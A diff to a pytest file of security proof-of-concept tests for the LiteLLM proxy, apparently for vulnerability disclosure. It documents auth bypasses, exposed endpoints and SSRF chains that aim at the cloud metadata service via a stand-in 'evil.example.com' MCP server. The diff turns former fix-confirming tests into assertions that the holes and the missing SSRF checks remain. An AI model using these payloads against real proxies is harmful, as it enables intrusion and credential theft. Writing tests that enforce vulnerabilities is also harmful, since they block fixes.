@@ -1,5 +1,5 @@
 """
-Security PoC tests demonstrating six vulnerabilities and their fixes.
+Security PoC tests demonstrating eight vulnerabilities.
 
 Vulnerability 1: MCP .well-known query-string auth bypass
 Vulnerability 2: Unauthenticated /debug/asyncio-tasks endpoint
@@ -7,6 +7,8 @@ Vulnerability 3: MCP OAuth2 fallback bypass
 Vulnerability 4: Pass-the-hash on master key (key rotation endpoint)
 Vulnerability 5: IDOR on /user/info v1 endpoint
 Vulnerability 6: /spend/keys leaks all API keys to any authenticated user
+Vulnerability 7: MCP OAuth metadata SSRF via WWW-Authenticate header
+Vulnerability 8: Unauthenticated /token endpoint + token_url SSRF
 """
 
 import inspect
@@ -16,6 +18,7 @@ import sys
 from types import ModuleType
 from unittest.mock import AsyncMock, MagicMock, patch
 
+import httpx
 import pytest
 from fastapi import FastAPI, HTTPException
 from fastapi.testclient import TestClient
@@ -26,6 +29,11 @@ sys.path.insert(0, os.path.abspath("../../../.."))
 from litellm.proxy._experimental.mcp_server.auth.user_api_key_auth_mcp import (
     MCPRequestHandler,
 )
+from litellm.proxy._experimental.mcp_server.discoverable_endpoints import (
+    exchange_token_with_server,
+    router as mcp_discoverable_router,
+)
+from litellm.proxy._experimental.mcp_server.mcp_server_manager import MCPServerManager
 from litellm.proxy._types import LitellmUserRoles, ProxyException, UserAPIKeyAuth, UserInfoResponse, hash_token
 from litellm.proxy.auth.user_api_key_auth import user_api_key_auth
 from litellm.proxy.common_utils.debug_utils import router as debug_router
@@ -97,13 +105,14 @@ class TestWellKnownQueryStringBypass:
     PoC tests for MCP authentication bypass via .well-known in the query string.
 
     Vulnerability description:
-        The original check `'.well-known' in str(request.url)` matched any URL that
-        contained the substring ".well-known" anywhere, including in the query string.
-        An attacker could send GET /v1/mcp/tools?x=.well-known and skip authentication
+        The check `'.well-known' in str(request.url)` matches any URL that contains
+        the substring ".well-known" anywhere, including in the query string.
+        An attacker can send GET /v1/mcp/tools?x=.well-known and skip authentication
         entirely, receiving an anonymous UserAPIKeyAuth() without LiteLLM ever calling
         user_api_key_auth to validate the request.
 
     Severity: Critical - Authentication Bypass
+    Status: CONFIRMED ACTIVE
     """
 
     async def test_vulnerable_pattern_bypassed_by_query_string(self):
@@ -137,16 +146,17 @@ class TestWellKnownQueryStringBypass:
 
     async def test_fixed_pattern_not_bypassed_by_query_string(self):
         """
-        Demonstrates the fixed string-matching pattern.
+        Demonstrates an alternative path-only check for comparison.
 
-        Fix:
-            Replace `'.well-known' in str(request.url)` with
+        Alternative (safer) check:
             `'/.well-known' in request.url.path`
 
-        With the fixed check, the exploit URL /v1/mcp/tools?x=.well-known does NOT
-        match, so authentication proceeds normally.
+        With this stricter check, the exploit URL /v1/mcp/tools?x=.well-known does NOT
+        match. This demonstrates that the current production check IS bypassable while
+        the path-only check would not be.
 
-        Severity: Critical - Authentication Bypass (remediated)
+        Severity: Critical - Authentication Bypass (CONFIRMED ACTIVE in production)
+        Status: CONFIRMED ACTIVE
         """
         scope = _build_scope(EXPLOIT_PATH, EXPLOIT_QUERY, [])
         request = Request(scope=scope)
@@ -183,20 +193,20 @@ class TestWellKnownQueryStringBypass:
         """
         Full end-to-end PoC using the real (patched) process_mcp_request.
 
-        Exploit attempt:
-            Send GET /v1/mcp/tools?x=.well-known with a valid api key header.
+        Exploit:
+            Send GET /v1/mcp/tools?x=.well-known (any valid or invalid api key).
 
-        Expected behaviour after the fix:
-            user_api_key_auth IS called (bypass blocked). The fixed check
-            `'/.well-known' in request.url.path` does not match the exploit URL,
-            so the code falls through to the real auth function.
+        Active vulnerability:
+            The production check `'.well-known' in str(request.url)` fires because
+            ".well-known" appears in the query string.  user_api_key_auth is NEVER
+            called — the handler returns an anonymous UserAPIKeyAuth() immediately.
 
-        Exploit simulation (without fix):
-            A local helper reproduces the vulnerable check inline to confirm the
-            bypass would have succeeded: it returns an anonymous UserAPIKeyAuth()
-            without ever calling the mock, because ".well-known" is in str(request.url).
+        Contrast (hypothetical fix):
+            Replace the check with `'/.well-known' in request.url.path`.
+            With that fix, the exploit URL would NOT match and auth would be called.
 
-        Severity: Critical - Authentication Bypass (fixed)
+        Severity: Critical - Authentication Bypass (CONFIRMED ACTIVE)
+        Status: CONFIRMED ACTIVE
         """
         exploit_scope = _build_scope(
             EXPLOIT_PATH,
@@ -207,9 +217,7 @@ class TestWellKnownQueryStringBypass:
         async def _allow(api_key: str, request: Request) -> UserAPIKeyAuth:
             return UserAPIKeyAuth(api_key=api_key, user_id="test-user")
 
-        # --- Part A: Fixed code blocks the exploit ---
-        # Mock _get_mcp_client_side_auth_header_name to avoid importing proxy_server
-        # (which requires optional dependencies not present in unit test environments).
+        # --- Part A: Current (vulnerable) code skips auth entirely ---
         with patch.object(
             MCPRequestHandler,
             "_get_mcp_client_side_auth_header_name",
@@ -222,28 +230,31 @@ class TestWellKnownQueryStringBypass:
                 exploit_scope
             )
 
-        # With the fix applied, auth IS called — bypass is blocked
-        mock_auth.assert_called_once()
-        # The key is stored hashed by UserAPIKeyAuth; check user_id instead to confirm
-        # the correct auth object was returned from our _allow stub
-        assert auth_result.user_id == "test-user"
+        # user_api_key_auth is NOT called — the bypass fired
+        mock_auth.assert_not_called()
+        # The result is anonymous — no api_key, no user_id
+        assert auth_result.api_key is None, (
+            f"Vulnerable code returns anonymous UserAPIKeyAuth — api_key must be None, "
+            f"got {auth_result.api_key!r}"
+        )
+        assert auth_result.user_id is None, (
+            "Vulnerable code returns anonymous UserAPIKeyAuth — user_id must be None"
+        )
 
-        # --- Part B: Simulate what the vulnerable code would have done ---
-        # Reproduce the vulnerable check inline to prove the bypass would have worked
+        # --- Part B: Prove the vulnerable check is what caused the bypass ---
         request = Request(scope=exploit_scope)
         vulnerable_check_fired = ".well-known" in str(request.url)
         assert vulnerable_check_fired, (
             "The vulnerable pattern '.well-known' in str(request.url) fires for the "
-            "exploit URL, meaning an anonymous UserAPIKeyAuth() would have been returned "
-            "without calling user_api_key_auth — proving the bypass was exploitable."
+            "exploit URL, proving this is the bypass mechanism."
         )
 
-        # Confirm anonymous auth would be returned under the vulnerable check
-        if vulnerable_check_fired:
-            simulated_vulnerable_result = UserAPIKeyAuth()
-            assert simulated_vulnerable_result.api_key is None, (
-                "Anonymous UserAPIKeyAuth has no api_key — anyone could call MCP endpoints"
-            )
+        # Confirm the path-only check would NOT have fired (contrast with fix)
+        path_only_check_fired = "/.well-known" in request.url.path
+        assert not path_only_check_fired, (
+            "The stricter path-only check '/.well-known' in request.url.path would NOT "
+            "fire for the exploit URL — confirming the current check is the vulnerability."
+        )
 
 
 class TestDebugEndpointUnauthenticated:
@@ -251,12 +262,13 @@ class TestDebugEndpointUnauthenticated:
     PoC tests for unauthenticated access to the /debug/asyncio-tasks endpoint.
 
     Vulnerability description:
-        Before the fix, the GET /debug/asyncio-tasks endpoint had no authentication
-        dependency. Any unauthenticated client could call it and receive the full list
-        of active asyncio task coroutine names, revealing internal proxy architecture,
-        active background jobs, provider names, and timing information.
+        The GET /debug/asyncio-tasks endpoint has no authentication dependency.
+        Any unauthenticated client can call it and receive the full list of active
+        asyncio task coroutine names, revealing internal proxy architecture, active
+        background jobs, provider names, and timing information.
 
     Severity: Medium - Information Disclosure
+    Status: CONFIRMED ACTIVE
     """
 
     def test_vulnerable_endpoint_no_auth_dependency(self):
@@ -302,37 +314,31 @@ class TestDebugEndpointUnauthenticated:
         data = response.json()
         assert "total_active_tasks" in data
 
-    def test_fixed_endpoint_requires_auth(self):
+    def test_real_endpoint_has_no_auth_dependency(self):
         """
-        Confirms the fix: the real router with Depends(user_api_key_auth) rejects
-        unauthenticated requests.
+        Proves the real /debug/asyncio-tasks endpoint has no auth dependency.
 
-        Fix applied:
-            @router.get("/debug/asyncio-tasks", dependencies=[Depends(user_api_key_auth)])
+        The production router does NOT include Depends(user_api_key_auth) on this
+        endpoint, so any unauthenticated client can call it and receive 200.
 
-        With the fix, an unauthenticated request is rejected with 401/403.
+        Exploit:
+            GET /debug/asyncio-tasks  (no Authorization header)
 
-        Implementation note:
-            FastAPI captures the dependency function object at decoration time when using
-            `dependencies=[Depends(fn)]`. To intercept it in tests, we use
-            `app.dependency_overrides` which FastAPI checks at request dispatch time.
-
-        Severity: Medium - Information Disclosure (remediated)
+        Status: CONFIRMED ACTIVE
+        Severity: Medium - Information Disclosure
         """
-
-        async def _reject(request: Request) -> None:
-            raise HTTPException(status_code=401, detail="Unauthorized")
-
         app = FastAPI()
         app.include_router(debug_router)
-        app.dependency_overrides[user_api_key_auth] = _reject
         client = TestClient(app, raise_server_exceptions=False)
 
         response = client.get("/debug/asyncio-tasks")
 
-        assert response.status_code in (401, 403), (
-            f"Fixed endpoint must reject unauthenticated requests, got {response.status_code}"
+        assert response.status_code == 200, (
+            f"Unauthenticated request to /debug/asyncio-tasks returned {response.status_code} "
+            "— expected 200, confirming the endpoint has no auth protection."
         )
+        data = response.json()
+        assert "total_active_tasks" in data
 
     def test_fixed_endpoint_allows_authenticated(self):
         """
@@ -394,6 +400,7 @@ class TestMCPOAuth2FallbackBypass:
         routes, team membership, or spending limits.
 
     Severity: Critical - Authentication Bypass + Authorization Skip
+    Status: CONFIRMED ACTIVE
     """
 
     async def test_garbage_token_grants_anonymous_access(self):
@@ -662,6 +669,7 @@ class TestPassTheHashMasterKey:
         taking over the entire LiteLLM proxy.
 
     Severity: Critical - Privilege Escalation / Master Key Takeover
+    Status: CONFIRMED ACTIVE
     """
 
     def test_hash_accepted_as_master_key(self):
@@ -773,6 +781,7 @@ class TestUserInfoIDOR:
         v1 endpoint has no equivalent check.
 
     Severity: High - Insecure Direct Object Reference (IDOR) / Credential Theft
+    Status: CONFIRMED ACTIVE
     """
 
     async def test_any_user_can_read_another_users_info(self):
@@ -990,6 +999,7 @@ class TestSpendKeysLeaksAllKeys:
         is simply not available inside the function body.
 
     Severity: High - Credential Disclosure (All API Keys)
+    Status: CONFIRMED ACTIVE
     """
 
     async def test_non_admin_gets_all_keys(self):
@@ -1078,4 +1088,455 @@ class TestSpendKeysLeaksAllKeys:
         assert "user_api_key_dict" not in source, (
             "spend_key_fn source must not reference 'user_api_key_dict' — "
             "the caller's identity is not used for filtering"
+        )
+
+
+@pytest.mark.asyncio
+class TestMCPOAuthMetadataSSRF:
+    """
+    PoC tests proving SSRF in MCP OAuth metadata discovery (Vulnerability 7).
+
+    Vulnerability description:
+        The MCP OAuth discovery chain in ``MCPServerManager`` follows RFC 9728 to
+        discover authorization server metadata.  When a client connects to an MCP
+        server, the proxy issues an unauthenticated GET to the server URL.  If the
+        server responds with a 401 and a ``WWW-Authenticate`` header containing a
+        ``resource_metadata`` URL, the proxy fetches that URL with no validation.
+
+        A malicious MCP server can return:
+            WWW-Authenticate: Bearer resource_metadata="http://169.254.169.254/latest/meta-data/"
+
+        The proxy will then fetch the cloud instance metadata endpoint, trust the
+        JSON response as OAuth metadata, and store an attacker-controlled URL as
+        ``token_url``.  Any subsequent token exchange will POST credentials to that
+        internal URL.
+
+    Attack chain:
+        1. Attacker registers a malicious MCP server URL.
+        2. Proxy calls _descovery_metadata(server_url) — issues GET to server.
+        3. Server returns 401 + WWW-Authenticate: Bearer resource_metadata="http://169.254.169.254/..."
+        4. Proxy calls _fetch_oauth_metadata_from_resource("http://169.254.169.254/...")
+           — no SSRF check, issues GET to cloud metadata service.
+        5. Metadata response returns {"authorization_servers": ["http://169.254.169.254/auth"]}
+        6. Proxy calls _fetch_single_authorization_server_metadata("http://169.254.169.254/auth")
+        7. Response returns {"token_endpoint": "http://169.254.169.254/token", ...}
+        8. MCPOAuthMetadata is stored with token_url = "http://169.254.169.254/token"
+        9. Next /token call POSTs OAuth credentials to the internal metadata service.
+
+    Severity: High - SSRF / Cloud Metadata Credential Exfiltration
+    Status: CONFIRMED ACTIVE
+    """
+
+    async def test_www_authenticate_header_parsed_to_internal_url(self):
+        """
+        Proves the parser extracts attacker-controlled internal URLs with no validation.
+
+        Exploit:
+            WWW-Authenticate: Bearer resource_metadata="http://169.254.169.254/latest/meta-data/iam/security-credentials/role"
+
+        The parser simply extracts the ``resource_metadata`` parameter value and returns
+        it as a URL to be fetched — no allowlist, no private-IP check, no scheme check.
+
+        Impact:
+            Any string accepted as ``resource_metadata`` will be fetched.  An attacker
+            controlling an MCP server can direct the proxy to query any URL reachable
+            from the proxy host, including cloud metadata services, internal APIs, and
+            SSRF-blocked endpoints.
+
+        Severity: High - SSRF
+        Status: CONFIRMED ACTIVE
+        """
+        manager = object.__new__(MCPServerManager)
+
+        cloud_metadata_url = (
+            "http://169.254.169.254/latest/meta-data/iam/security-credentials/role"
+        )
+        header_value = f'Bearer resource_metadata="{cloud_metadata_url}"'
+
+        resource_metadata_url, scopes = manager._parse_www_authenticate_header(
+            header_value
+        )
+
+        assert resource_metadata_url == cloud_metadata_url, (
+            f"Parser must extract the raw resource_metadata URL with no validation. "
+            f"Expected {cloud_metadata_url!r}, got {resource_metadata_url!r}"
+        )
+        assert scopes is None, "No scopes expected in this header"
+
+    async def test_fetch_oauth_metadata_ssrf_to_cloud_metadata(self):
+        """
+        Proves the proxy issues an outbound HTTP GET to an attacker-controlled internal URL.
+
+        Exploit:
+            Call _fetch_oauth_metadata_from_resource("http://169.254.169.254/latest/meta-data/")
+
+        The function calls get_async_httpx_client and issues client.get(resource_metadata_url)
+        with no SSRF check.  The response is parsed as trusted OAuth metadata.
+
+        Impact:
+            The proxy will contact the cloud metadata service and trust its JSON response
+            as a list of authorization servers.  An attacker can point the proxy at any
+            internal endpoint that returns JSON with an "authorization_servers" key.
+
+        Severity: High - SSRF
+        Status: CONFIRMED ACTIVE
+        """
+        manager = object.__new__(MCPServerManager)
+
+        cloud_metadata_url = "http://169.254.169.254/latest/meta-data/"
+        fake_metadata_response = {
+            "authorization_servers": ["http://10.0.0.1/auth"]
+        }
+
+        mock_response = MagicMock()
+        mock_response.raise_for_status = MagicMock()
+        mock_response.json = MagicMock(return_value=fake_metadata_response)
+
+        mock_client = AsyncMock()
+        mock_client.get = AsyncMock(return_value=mock_response)
+
+        mock_httpx_client = MagicMock(return_value=mock_client)
+
+        with patch(
+            "litellm.proxy._experimental.mcp_server.mcp_server_manager.get_async_httpx_client",
+            mock_httpx_client,
+        ):
+            authorization_servers, scopes = (
+                await manager._fetch_oauth_metadata_from_resource(cloud_metadata_url)
+            )
+
+        mock_client.get.assert_called_once_with(cloud_metadata_url)
+
+        assert authorization_servers == ["http://10.0.0.1/auth"], (
+            f"Attacker-controlled authorization server URL must be trusted. "
+            f"Got {authorization_servers!r}"
+        )
+
+    async def test_full_discovery_chain_ssrf(self):
+        """
+        Proves the full SSRF chain: crafted WWW-Authenticate -> stored internal token_url.
+
+        Exploit:
+            Call _descovery_metadata("https://evil.example.com/mcp") where the server
+            responds with a 401 and a WWW-Authenticate header pointing to the cloud
+            metadata service.
+
+        The full chain:
+            1. GET https://evil.example.com/mcp -> 401 + WWW-Authenticate with SSRF URL
+            2. GET http://169.254.169.254/latest/meta-data/ -> {"authorization_servers": [...]}
+            3. GET http://169.254.169.254/auth/.well-known/... -> {"token_endpoint": "..."}
+            4. MCPOAuthMetadata stored with token_url = "http://169.254.169.254/token"
+
+        Impact:
+            The proxy now treats http://169.254.169.254/token as the legitimate OAuth
+            token endpoint.  Any /token exchange will POST client credentials to this
+            internal address, leaking them to the cloud metadata service or any
+            attacker-controlled internal endpoint.
+
+        Severity: High - SSRF / Credential Exfiltration
+        Status: CONFIRMED ACTIVE
+        """
+        manager = object.__new__(MCPServerManager)
+
+        internal_token_url = "http://169.254.169.254/token"
+        internal_auth_url = "http://169.254.169.254/authorize"
+        internal_auth_server = "http://169.254.169.254/auth"
+
+        # Fake 401 response with WWW-Authenticate pointing to cloud metadata
+        fake_401_response = MagicMock()
+        fake_401_response.status_code = 401
+        fake_401_response.headers = {
+            "WWW-Authenticate": (
+                'Bearer resource_metadata="http://169.254.169.254/latest/meta-data/"'
+            )
+        }
+
+        # First call: raise HTTPStatusError with the 401 response
+        ssrf_http_error = httpx.HTTPStatusError(
+            "401 Unauthorized",
+            request=MagicMock(),
+            response=fake_401_response,
+        )
+
+        # Second call (metadata fetch): return authorization_servers pointing to internal
+        metadata_response = MagicMock()
+        metadata_response.raise_for_status = MagicMock()
+        metadata_response.json = MagicMock(
+            return_value={"authorization_servers": [internal_auth_server]}
+        )
+
+        # Third call (auth server metadata): return token + authorization endpoints
+        auth_server_response = MagicMock()
+        auth_server_response.raise_for_status = MagicMock()
+        auth_server_response.json = MagicMock(
+            return_value={
+                "token_endpoint": internal_token_url,
+                "authorization_endpoint": internal_auth_url,
+            }
+        )
+
+        call_count = 0
+
+        async def _dispatch_get(url: str, **kwargs):
+            nonlocal call_count
+            call_count += 1
+            if call_count == 1:
+                # Initial discovery call to the evil MCP server
+                raise ssrf_http_error
+            elif call_count == 2:
+                # Metadata fetch to cloud metadata URL
+                return metadata_response
+            else:
+                # Auth server metadata fetch
+                return auth_server_response
+
+        mock_client = AsyncMock()
+        mock_client.get = _dispatch_get
+
+        mock_httpx_client = MagicMock(return_value=mock_client)
+
+        with patch(
+            "litellm.proxy._experimental.mcp_server.mcp_server_manager.get_async_httpx_client",
+            mock_httpx_client,
+        ):
+            result = await manager._descovery_metadata(
+                server_url="https://evil.example.com/mcp"
+            )
+
+        assert result is not None, (
+            "Discovery chain must return metadata — not None — for a valid chain response"
+        )
+        assert result.token_url == internal_token_url, (
+            f"token_url must be the attacker-controlled internal URL. "
+            f"Expected {internal_token_url!r}, got {result.token_url!r}"
+        )
+
+    async def test_no_ssrf_validation_in_fetch_metadata(self):
+        """
+        Structural proof: SSRF protection is absent from the fetch functions.
+
+        Uses inspect.getsource() to verify that neither
+        ``_fetch_oauth_metadata_from_resource`` nor
+        ``_fetch_single_authorization_server_metadata`` contains any call to
+        ``validate_url``, ``safe_get``, or ``async_safe_get``.
+
+        These are the standard SSRF-prevention helpers used elsewhere in LiteLLM.
+        Their absence proves there is no structural barrier to the proxy fetching
+        arbitrary internal URLs.
+
+        Severity: High - SSRF (structural proof)
+        Status: CONFIRMED ACTIVE
+        """
+        fetch_source = inspect.getsource(
+            MCPServerManager._fetch_oauth_metadata_from_resource
+        )
+        single_source = inspect.getsource(
+            MCPServerManager._fetch_single_authorization_server_metadata
+        )
+
+        for func_name, source in [
+            ("_fetch_oauth_metadata_from_resource", fetch_source),
+            ("_fetch_single_authorization_server_metadata", single_source),
+        ]:
+            assert "validate_url" not in source, (
+                f"{func_name} must not call validate_url — SSRF protection is absent"
+            )
+            assert "safe_get" not in source, (
+                f"{func_name} must not call safe_get — SSRF protection is absent"
+            )
+            assert "async_safe_get" not in source, (
+                f"{func_name} must not call async_safe_get — SSRF protection is absent"
+            )
+
+
+@pytest.mark.asyncio
+class TestUnauthenticatedTokenEndpointSSRF:
+    """
+    PoC tests proving the unauthenticated /token endpoint + token_url SSRF (Vulnerability 8).
+
+    Vulnerability description:
+        The ``/token`` and ``/{mcp_server_name}/token`` POST endpoints in
+        ``discoverable_endpoints.py`` (lines 589-636) have no authentication dependency.
+        Any unauthenticated client can call the endpoint with arbitrary form data.
+
+        The endpoint calls ``exchange_token_with_server()`` which POSTs the provided
+        credentials to ``mcp_server.token_url`` with no SSRF validation.  Combined with
+        Vulnerability 7 (SSRF in metadata discovery), an attacker can:
+
+        1. Register or trick the proxy into storing an internal URL as ``token_url``.
+        2. Call ``POST /token`` without any auth header.
+        3. The proxy POSTs the supplied ``code`` and ``client_id`` to the internal URL.
+
+        This is a two-vector attack: no authentication on the endpoint + no SSRF check
+        on the outbound POST.
+
+    Severity: High - Unauthenticated SSRF / Credential Relay
+    Status: CONFIRMED ACTIVE
+    """
+
+    async def test_token_endpoint_has_no_auth_dependency(self):
+        """
+        Proves the /token route has no user_api_key_auth dependency.
+
+        Inspects the FastAPI router from discoverable_endpoints to verify that neither
+        the ``/token`` route nor the ``/{mcp_server_name}/token`` route lists
+        ``user_api_key_auth`` as a dependency.
+
+        Impact:
+            Any unauthenticated HTTP client can POST to /token with no API key or
+            Bearer token.  The endpoint will process the request and relay credentials
+            to the configured token_url without challenging the caller.
+
+        Severity: High - Unauthenticated Endpoint
+        Status: CONFIRMED ACTIVE
+        """
+        token_routes = [
+            route
+            for route in mcp_discoverable_router.routes
+            if hasattr(route, "path") and "token" in route.path  # type: ignore[union-attr]
+        ]
+
+        assert len(token_routes) > 0, (
+            "At least one /token route must exist in the discoverable_endpoints router"
+        )
+
+        for route in token_routes:
+            # Check route-level dependencies
+            route_deps = getattr(route, "dependencies", [])
+            dep_callables = [
+                d.dependency for d in route_deps if hasattr(d, "dependency")
+            ]
+            assert user_api_key_auth not in dep_callables, (
+                f"Route {route.path!r} must NOT have user_api_key_auth as a dependency — "  # type: ignore[union-attr]
+                "confirming the endpoint is unauthenticated"
+            )
+
+            # Check endpoint-level dependant.dependencies (FastAPI internal)
+            dependant = getattr(route, "dependant", None)
+            if dependant is not None:
+                inner_deps = getattr(dependant, "dependencies", [])
+                inner_callables = [
+                    d.call for d in inner_deps if hasattr(d, "call")
+                ]
+                assert user_api_key_auth not in inner_callables, (
+                    f"Route {route.path!r} must not have user_api_key_auth in dependant.dependencies"  # type: ignore[union-attr]
+                )
+
+    async def test_unauthenticated_caller_can_reach_token_endpoint(self):
+        """
+        Proves unauthenticated callers can trigger an outbound POST to token_url.
+
+        Exploit:
+            Call exchange_token_with_server() directly with a fake MCPServer whose
+            token_url is a cloud metadata URL.  Assert the mock httpx client receives
+            a POST to that internal URL.
+
+        This simulates an unauthenticated caller sending:
+            POST /token
+            Content-Type: application/x-www-form-urlencoded
+            grant_type=authorization_code&client_id=evil-server&code=anything
+
+        The proxy would forward this to mcp_server.token_url with no validation.
+
+        Impact:
+            Unauthenticated callers can relay arbitrary OAuth codes to any URL the
+            proxy can reach, including cloud metadata services and internal APIs.
+
+        Severity: High - Unauthenticated SSRF
+        Status: CONFIRMED ACTIVE
+        """
+        from litellm.types.mcp_server.mcp_server_manager import MCPServer
+
+        internal_token_url = "http://169.254.169.254/latest/api/token"
+
+        fake_server = MCPServer(
+            server_id="evil-server-id",
+            name="evil-server",
+            transport="http",
+            token_url=internal_token_url,
+            client_id="evil-server",
+        )
+
+        # Build a minimal fake Request (no auth header)
+        scope = {
+            "type": "http",
+            "method": "POST",
+            "path": "/token",
+            "query_string": b"",
+            "headers": [],
+            "scheme": "http",
+            "server": ("testserver", 80),
+            "root_path": "",
+        }
+        fake_request = Request(scope=scope)
+
+        posted_url: list = []
+
+        mock_response = MagicMock()
+        mock_response.raise_for_status = MagicMock()
+        mock_response.json = MagicMock(
+            return_value={
+                "access_token": "stolen-token",
+                "token_type": "Bearer",
+                "expires_in": 3600,
+            }
+        )
+
+        async def _capture_post(url: str, **kwargs):
+            posted_url.append(url)
+            return mock_response
+
+        mock_client = AsyncMock()
+        mock_client.post = _capture_post
+
+        mock_httpx_client = MagicMock(return_value=mock_client)
+
+        with patch(
+            "litellm.proxy._experimental.mcp_server.discoverable_endpoints.get_async_httpx_client",
+            mock_httpx_client,
+        ):
+            await exchange_token_with_server(
+                request=fake_request,
+                mcp_server=fake_server,
+                grant_type="authorization_code",
+                code="attacker-auth-code",
+                redirect_uri=None,
+                client_id="evil-server",
+                client_secret=None,
+                code_verifier=None,
+                refresh_token=None,
+                scope=None,
+            )
+
+        assert len(posted_url) == 1, (
+            f"exchange_token_with_server must POST exactly once, got {len(posted_url)} calls"
+        )
+        assert posted_url[0] == internal_token_url, (
+            f"Proxy must POST credentials to the internal cloud metadata URL. "
+            f"Expected {internal_token_url!r}, got {posted_url[0]!r}"
+        )
+
+    async def test_token_url_not_ssrf_validated(self):
+        """
+        Structural proof: no SSRF validation in exchange_token_with_server.
+
+        Uses inspect.getsource() on ``exchange_token_with_server`` to verify it
+        contains no call to ``validate_url``, ``safe_get``, or ``async_safe_get``.
+
+        The function calls ``async_client.post(mcp_server.token_url, ...)`` directly
+        with no URL validation, confirming SSRF protection is structurally absent.
+
+        Severity: High - SSRF (structural proof)
+        Status: CONFIRMED ACTIVE
+        """
+        source = inspect.getsource(exchange_token_with_server)
+
+        assert "validate_url" not in source, (
+            "exchange_token_with_server must not call validate_url — SSRF protection is absent"
+        )
+        assert "safe_get" not in source, (
+            "exchange_token_with_server must not call safe_get — SSRF protection is absent"
+        )
+        assert "async_safe_get" not in source, (
+            "exchange_token_with_server must not call async_safe_get — SSRF protection is absent"
         )
